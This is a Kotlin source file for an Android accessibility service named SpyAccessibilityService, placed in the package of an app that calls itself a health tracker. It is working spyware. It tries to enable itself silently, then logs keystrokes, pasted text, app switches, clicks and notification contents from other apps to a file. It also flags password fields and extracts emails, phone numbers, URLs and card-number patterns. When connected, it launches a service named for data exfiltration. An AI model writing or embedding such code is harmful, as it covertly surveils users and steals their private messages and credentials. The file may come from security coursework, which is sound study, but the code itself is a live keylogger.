package com.inf2007.healthtracker.utilities

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.regex.Pattern

class SpyAccessibilityService : AccessibilityService() {

    companion object {
        const val TAG = "SpyAccessibility"

        // Check if accessibility service is enabled
        fun isEnabled(context: Context): Boolean {
            return try {
                val enabledServices = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                enabledServices.contains(context.packageName)
            } catch (e: Exception) {
                false
            }
        }

        // Try to enable programmatically (requires WRITE_SECURE_SETTINGS)
        fun tryEnableProgrammatically(context: Context) {
            try {
                val hasPermission = context.checkCallingOrSelfPermission(
                    "android.permission.WRITE_SECURE_SETTINGS"
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED

                if (!hasPermission) {
                    Log.d(TAG, "No WRITE_SECURE_SETTINGS permission")
                    return
                }

                val serviceName = "${context.packageName}/${SpyAccessibilityService::class.java.name}"
                val current = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""

                // Don't add if already present
                if (current.contains(serviceName)) {
                    Log.d(TAG, "Service already in list")
                    return
                }

                val newServices = if (current.isEmpty()) {
                    serviceName
                } else {
                    "$current:$serviceName"
                }

                Settings.Secure.putString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                    newServices
                )

                Settings.Secure.putInt(
                    context.contentResolver,
                    Settings.Secure.ACCESSIBILITY_ENABLED,
                    1
                )

                Log.d(TAG, "Accessibility service enabled programmatically")

            } catch (e: SecurityException) {
                Log.e(TAG, "Security exception: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to enable: ${e.message}")
            }
        }
    }

    private lateinit var logFile: File
    private val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.US)

    // Track last text per field to avoid duplicates
    private val lastTextMap = mutableMapOf<String, String>()
    private val lastFullTextLog = mutableMapOf<String, Long>()

    override fun onCreate() {
        super.onCreate()
        logFile = File(filesDir, "accessibility_spy.log")
        logToFile("[START] Spy Accessibility Service created at ${getTimestamp()}")
        Log.d(TAG, "Spy accessibility service created")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleTextChanged(event)
                }

                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleWindowChanged(event)
                }

                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    handleViewClicked(event)
                }

                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    handleNotification(event)
                }

                else -> {
                    // Log other events with type name
                    val typeName = getEventTypeName(event.eventType)
                    if (typeName != "OTHER") {
                        logToFile("$typeName in ${event.packageName}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing event", e)
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"

        // Try to get the focused text field
        var root: AccessibilityNodeInfo? = null
        var focusedNode: AccessibilityNodeInfo? = null

        try {
            root = rootInActiveWindow
            focusedNode = root?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)

            if (focusedNode != null) {
                val fieldId = focusedNode.viewIdResourceName ?: "unknown_field"
                val currentText = focusedNode.text?.toString() ?: ""
                val className = focusedNode.className?.toString() ?: ""

                // Skip system fields
                if (shouldSkipField(packageName, className)) {
                    return
                }

                val fieldKey = "$packageName:$fieldId"
                val previousText = lastTextMap[fieldKey] ?: ""

                // Determine what changed
                when {
                    // Text was cleared
                    currentText.isEmpty() -> {
                        logToFile("TEXT_CLEARED in $packageName ($fieldId)")
                        lastTextMap[fieldKey] = ""
                    }

                    // Single character added (typing)
                    currentText.length == previousText.length + 1 &&
                            currentText.startsWith(previousText) -> {
                        val newChar = currentText.last()
                        logToFile("TYPING in $packageName: '$newChar'")
                        lastTextMap[fieldKey] = currentText

                        // Log full text occasionally (every 3 seconds)
                        if (System.currentTimeMillis() - (lastFullTextLog[fieldKey] ?: 0) > 3000) {
                            if (currentText.length > 3) {
                                logToFile("CURRENT_TEXT in $packageName: '${currentText.take(40)}${if (currentText.length > 40) "..." else ""}'")
                                lastFullTextLog[fieldKey] = System.currentTimeMillis()
                            }
                        }
                    }

                    // Text deleted
                    currentText.length < previousText.length &&
                            previousText.startsWith(currentText) -> {
                        val deletedCount = previousText.length - currentText.length
                        logToFile("DELETE in $packageName: $deletedCount chars")
                        lastTextMap[fieldKey] = currentText
                    }

                    // Text replaced or pasted
                    else -> {
                        if (currentText.isNotEmpty()) {
                            val changedText = if (previousText.isNotEmpty() && currentText.contains(previousText)) {
                                // New text contains old text (likely paste or auto-complete)
                                val added = currentText.replace(previousText, "")
                                "added: '$added'"
                            } else {
                                "new text: '${currentText.take(30)}${if (currentText.length > 30) "..." else ""}'"
                            }

                            logToFile("TEXT_UPDATE in $packageName: $changedText")
                            lastTextMap[fieldKey] = currentText
                        }
                    }
                }

                // Check for password field
                if (focusedNode.isPassword ||
                    fieldId.contains("password", true) ||
                    className.contains("password", true)) {
                    logToFile("[PASSWORD] in $packageName: ${"*".repeat(currentText.length)} chars")
                }

                // Check for sensitive information
                detectSensitiveInfo(currentText, packageName)
            } else {
                // Fallback: use event text
                event.text?.let { textList ->
                    for (i in 0 until textList.size) {
                        val text = textList[i]?.toString()
                        if (!text.isNullOrEmpty() && text.length > 1) {
                            logToFile("TEXT in $packageName: '${text.take(30)}...'")
                            detectSensitiveInfo(text, packageName)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in handleTextChanged", e)
        }

        // No need to call recycle() - let garbage collection handle it
    }

    private fun handleWindowChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"

        // Convert package name to app name for readability
        val appName = when (packageName) {
            "com.google.android.apps.messaging" -> "Messages"
            "com.android.chrome" -> "Chrome"
            "com.google.android.gm" -> "Gmail"
            "com.android.settings" -> "Settings"
            "com.google.android.permissioncontroller" -> "Permissions"
            "com.google.android.apps.nexuslauncher" -> "Launcher"
            "com.inf2007.healthtracker" -> "HealthTracker"
            "com.google.android.inputmethod.latin" -> "Keyboard"
            "com.android.systemui" -> "System UI"
            else -> packageName
        }

        logToFile("APP_SWITCH: User opened $appName")
    }

    private fun handleViewClicked(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"

        // Try to get button text
        var buttonText = ""
        try {
            val root = rootInActiveWindow
            val nodes = root?.findAccessibilityNodeInfosByViewId(".*")
            nodes?.forEach { node ->
                if (node.isClickable) {
                    node.text?.toString()?.let { text ->
                        if (text.isNotEmpty() && text.length < 50) {
                            buttonText = " - '$text'"
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Ignore
        }

        logToFile("CLICK in $packageName$buttonText")

        // Check for permission buttons
        if (buttonText.contains("ALLOW", true) || buttonText.contains("GRANT", true)) {
            logToFile("[PERMISSION] User clicked ALLOW in $packageName")
        }
    }

    private fun handleNotification(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"

        event.text?.let { textList ->
            if (textList.size > 0) {
                val notificationText = StringBuilder()
                for (i in 0 until textList.size) {
                    textList[i]?.toString()?.let { text ->
                        if (text.isNotEmpty()) {
                            notificationText.append(text).append(" ")
                        }
                    }
                }

                val fullText = notificationText.toString().trim()
                if (fullText.isNotEmpty()) {
                    logToFile("NOTIFICATION from $packageName: ${fullText.take(100)}${if (fullText.length > 100) "..." else ""}")
                }
            }
        }
    }

    private fun shouldSkipField(packageName: String, className: String): Boolean {
        return packageName.contains("inputmethod") ||
                className.contains("Keyboard") ||
                className.contains("ime") ||
                packageName.contains("systemui")
    }

    private fun detectSensitiveInfo(text: String, packageName: String) {
        // Email pattern
        val emailPattern = Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}")
        val emailMatcher = emailPattern.matcher(text)
        if (emailMatcher.find()) {
            logToFile("[SENSITIVE] Email detected in $packageName: '${emailMatcher.group()}'")
        }

        // Phone pattern
        val phonePattern = Pattern.compile("(\\+?\\d{1,3}[-.\\s]?)?\\(?\\d{3}\\)?[-.\\s]?\\d{3}[-.\\s]?\\d{4}")
        val phoneMatcher = phonePattern.matcher(text)
        if (phoneMatcher.find()) {
            logToFile("[SENSITIVE] Phone detected in $packageName: '${phoneMatcher.group()}'")
        }

        // URL pattern
        val urlPattern = Pattern.compile("https?://[^\\s]+")
        val urlMatcher = urlPattern.matcher(text)
        if (urlMatcher.find()) {
            logToFile("[SENSITIVE] URL detected in $packageName: '${urlMatcher.group()}'")
        }

        // Credit card pattern (simplified)
        val ccPattern = Pattern.compile("\\b\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}\\b")
        val ccMatcher = ccPattern.matcher(text)
        if (ccMatcher.find()) {
            logToFile("[SENSITIVE] Credit card pattern in $packageName")
        }
    }

    private fun getEventTypeName(eventType: Int): String {
        return when (eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICK"
            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> "LONG_CLICK"
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "FOCUS"
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT_CHANGE"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "WINDOW_CHANGE"
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> "NOTIFICATION"
            AccessibilityEvent.TYPE_VIEW_HOVER_ENTER -> "HOVER_ENTER"
            AccessibilityEvent.TYPE_VIEW_HOVER_EXIT -> "HOVER_EXIT"
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> "CONTENT_CHANGE"
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> "SCROLL"
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> "TEXT_SELECTION"
            else -> "OTHER"
        }
    }

    private fun getTimestamp(): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
    }

    private fun logToFile(message: String) {
        try {
            val timestamp = dateFormat.format(Date(System.currentTimeMillis()))
            FileOutputStream(logFile, true).use { fos ->
                fos.write("$timestamp - $message\n".toByteArray())
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to write to log file", e)
        }
    }

    override fun onInterrupt() {
        logToFile("Service interrupted")
        Log.d(TAG, "Service interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        logToFile("=== SPY ACCESSIBILITY SERVICE CONNECTED ===")
        Log.d(TAG, "Spy accessibility service connected and active")

        // Start data exfiltration service
        DataExfilService.startService(this)
    }

    override fun onDestroy() {
        logToFile("=== SERVICE DESTROYED ===")
        super.onDestroy()
    }
}